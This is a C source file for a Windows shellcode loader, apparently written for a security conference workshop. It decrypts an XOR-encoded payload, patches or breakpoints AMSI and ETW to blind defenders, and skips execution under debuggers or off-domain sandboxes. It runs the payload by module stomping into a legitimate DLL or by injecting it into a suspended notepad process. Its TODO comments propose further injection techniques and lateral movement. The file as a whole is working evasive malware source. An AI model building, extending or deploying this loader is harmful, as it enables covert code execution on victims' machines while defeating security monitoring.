#include <windows.h>
#include "defines.h"
#include "auxiliary/syscalls.h"
#include "evasion/patch_amsi_etw.h"
// +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ #
// TODO Punkt 7                                                                                              #
// +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ #
#include "evasion/hwbp_amsi_etw.h"
#include "auxiliary/stomping.h"

#include "sandbox/domain.h"
#include "debug/debug_peb.h"

#ifdef RUN_PE
#include "execution/runpe.h"
#endif

#ifdef RUN_DOTNET
#include "execution/dotnet.h"
#endif

#ifdef VERBOSE
#define DBG(...) printf(__VA_ARGS__ "\n")
#else
#define DBG(...)
#endif

/**
 * XOR encrypts a payload with the given key and stores the result in "output".
 */
VOID 
XorCrypt(
    PCHAR payload, 
    PCHAR key,
    PCHAR output, 
    INT payloadLen
)
{
    INT keyLength = strlen(key);
    for (INT i = 0; i < payloadLen; ++i)
    {
        output[i] = payload[i] ^ key[i % keyLength];
    }
}

/**
 * Unpack the payload and run it. 
 */
INT
Run()
{
    NTSTATUS ntStatus;
    HMODULE  hNtdll;
    SIZE_T   payloadLen             = SHELLCODE_LEN;
//TODO Punkt 2
    //CHAR     payload[SHELLCODE_LEN] = SHELLCODE;
#ifdef SHELLCODE_FILE

    HANDLE hFile = CreateFileA(
        "payload.bin",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE)
    {
        return 1;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);

    CHAR* payload = (CHAR*)malloc(fileSize);

    DWORD bytesRead;
    ReadFile(hFile, payload, fileSize, &bytesRead, NULL);

    CloseHandle(hFile);

    payloadLen = fileSize;

#else

    CHAR payload[SHELLCODE_LEN] = SHELLCODE;

#endif
// ------------------------------------------------------------------------

#ifdef SANDBOX_DOMAIN
    if (!IsDomainJoined()) 
    {
        return 0;
    }
#endif

#ifdef ANTI_DEBUG
    if (IsBeingDebugged_PEB())
    {
        return 0;
    }
#endif

    // --------------------------------------------------------------------------------------
    // Resolve syscalls. See syscalls.h for more info.

    DBG("[*] Resolving syscalls...");
    hNtdll = HlpGetModuleHandle(0xC6161C18, 0x73DA31CB);
    PopulateSyscallMap(hNtdll);
    _NtProtectVirtualMemory  = GetSyscallEntry("ZwProtectVirtualMemory");
    _NtAllocateVirtualMemory = GetSyscallEntry("ZwAllocateVirtualMemory");
    _NtFreeVirtualMemory = GetSyscallEntry("ZwFreeVirtualMemory");
    // add more syscalls when needed
    DBG("[*] Done");

    // --------------------------------------------------------------------------------------

#ifdef PATCH_ETW
    if (!PatchETW(hNtdll))
    {
        return 1;
    }
    DBG("[*] patched ETW");
#endif

#ifdef PATCH_AMSI
    if (!PatchAMSI())
    {
        return 2;
    }
    DBG("[*] patched AMSI");
#endif

#ifdef HWBP_AMSI_ETW

    printf("PRESS ENTER TO SET HWBP...");
    getchar();

    if (!SetupHWBP_Evasion())
    {
        return 3;
    }

    printf("HWBP SET. PRESS ENTER TO CONTINUE...");
    getchar();

    DBG("[*] HWBP AMSI enabled");
#endif

    // --------------------------------------------------------------------------------------

    // Allocate memory for payload 

    ULONG  ulOld        = 0;
    LPVOID pAllocMem    = NULL;    
    SIZE_T allocSizeOut = payloadLen;

    PrepareSyscall(_NtAllocateVirtualMemory->syscallNumber, _NtAllocateVirtualMemory->syscallInstructionAddress);
    ntStatus = Syscall_NtAllocateVirtualMemory(
        GetCurrentProcess(), 
        &pAllocMem, 
        (ULONG_PTR)NULL, 
        &allocSizeOut, 
        MEM_COMMIT, 
        PAGE_READWRITE
    );
    
    if (!NT_SUCCESS(ntStatus))
    {
        exit(GetLastError());
    }

    DBG("[*] Allocated memory for payload");

    // Decrypt and copy to allocated memory

    // +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ //
    // TODO FOR YOU: Read the encrypted code from a (remote? local?) file instead of using the hardcoded payload //
    //               Maybe add a flag such as --shellcode-file and add the appropriate #ifdefs                   //
    // +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ //

    // TODO Punkt 2
    // CHAR decryptedPayload[SHELLCODE_LEN] = { 0 };
    CHAR* decryptedPayload = (CHAR*)malloc(payloadLen);
    
    XorCrypt(payload, ENCRYPTION_KEY, decryptedPayload, payloadLen);
    RtlCopyMemory(pAllocMem, decryptedPayload, payloadLen);
    
    DBG("[*] Decrypted payload");

    // --------------------------------------------------------------------------------------

#ifdef INJECT_SHELLCODE
    // Make shellcode page executable
    /*
    DWORD dwOld;
    PrepareSyscall(_NtProtectVirtualMemory->syscallNumber, _NtProtectVirtualMemory->syscallInstructionAddress);
    ntStatus = Syscall_NtProtectVirtualMemory(GetCurrentProcess(), &pAllocMem, (SIZE_T*)&payloadLen, PAGE_EXECUTE_READWRITE, &dwOld); // hmmm.... :)

    if (!NT_SUCCESS(ntStatus))
    {
        exit(GetLastError());
    }

    DBG("[*] Protected payload: RWX");
    */

    LPVOID pExecAddr = NULL;

    // 1. Execute stomping function
    // It loads the module and locates the .text section
    if (!PerformModuleStomping(pAllocMem, payloadLen, &pExecAddr)) {
        DBG("[!] Module Stomping failed!");
        exit(1);
    }

    DBG("[*] Payload stomped into legitim DLL at:");


    SIZE_T freeSize = 0; // For MEM_RELEASE, the size must be 0
    PrepareSyscall(_NtFreeVirtualMemory->syscallNumber, _NtFreeVirtualMemory->syscallInstructionAddress);
    
    // Free the originally allocated memory (pAllocMem)
    ntStatus = Syscall_NtFreeVirtualMemory(
        GetCurrentProcess(),
        &pAllocMem,
        &freeSize,
        MEM_RELEASE
    );

    if (NT_SUCCESS(ntStatus)) {
        DBG("[*] Cleaned up temporary pAllocMem. Stealth increased!");
        pAllocMem = NULL; // Nullify the pointer to prevent accidental reuse
    }


    // 2. Change permissions using SYSCALL (instead of VirtualProtect)
    // Change from Read/Write (required by memcpy) to Execute/Read
    DWORD dwOld;
    PrepareSyscall(_NtProtectVirtualMemory->syscallNumber, _NtProtectVirtualMemory->syscallInstructionAddress);
    
    // Use pExecAddr (the address in xpsprint.dll) instead of pAllocMem
    ntStatus = Syscall_NtProtectVirtualMemory(
        GetCurrentProcess(), 
        &pExecAddr, 
        (SIZE_T*)&payloadLen, 
        PAGE_EXECUTE_READ, // Don't need RWX; RX is sufficient and more secure!
        &dwOld
    );

    if (!NT_SUCCESS(ntStatus)) {
        /*
        exit(GetLastError());
        */
        DBG("[!] Failed to protect stomped memory:");
        exit(1);
    }

    DBG("[*] Protected stomped payload: RX");

    DBG("[*] Payload stomped into legitim DLL. PRESS ENTER TO RUN SHELLCODE...");
    getchar(); // Wait for the user to press Enter in the terminal

    // 3. Execute the code locally
    ((VOID(*)())pExecAddr)();

#endif

    // +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ //
    // TODO FOR YOU: Add other shellcode execution methods. Process Mockingjay? Remote injection? PoolParty? //
    // +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ //

    #ifdef REMOTE_INJECT

    // --- Remote Injection ---

    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};

    CreateProcessA(
        "C:\\Windows\\System32\\notepad.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED,
        NULL, NULL,
        &si, &pi
    );

    LPVOID remoteMem = VirtualAllocEx(
        pi.hProcess,
        NULL,
        payloadLen,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    WriteProcessMemory(
        pi.hProcess,
        remoteMem,
        decryptedPayload,
        payloadLen,
        NULL
    );

    DWORD oldProtect;
    VirtualProtectEx(
        pi.hProcess,
        remoteMem,
        payloadLen,
        PAGE_EXECUTE_READ,
        &oldProtect
    );

    CreateRemoteThread(
        pi.hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)remoteMem,
        NULL,
        0,
        NULL
    );

    ResumeThread(pi.hThread);

//#else

    // Run via direct pointer (local execution)
    /*
    ((VOID(*)())pAllocMem)();
    */

    // 3. Execute the code locally
    //((VOID(*)())pExecAddr)();

#endif

#ifdef RUN_PE
    RunPortableExecutable(pAllocMem, hNtdll);
#endif

#ifdef RUN_DOTNET
    // TODO Punkt 2
    // RunDotnetAssembly(pAllocMem, SHELLCODE_LEN);
    RunDotnetAssembly(pAllocMem, payloadLen);
#endif

    // --------------------------------------------------------------------------------------
    // Cleanup

    FreeSyscallMap();

    return 0; 
}

#ifndef AS_DLL
/**
 * Entry if compiled as EXE
 */
INT 
main()
{
    DBG("[*] Hello from malware made at x33fcon '24 :3");
    return Run();
}
#endif

#ifdef AS_DLL
/**
 * Entry if compiled as DLL
 */
BOOL 
APIENTRY 
DllMain(
    HANDLE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved 
)
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
            Run();
            break;
        case DLL_THREAD_ATTACH:  // A process is creating a new thread.
        case DLL_THREAD_DETACH:  // A thread exits normally.
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
            break;
    }
    return TRUE;
}
#endif

// +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~ //
// TODO FOR YOU: Besides DLL and EXE, maybe a service-executable can be useful for lateral movement //
// +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~ //
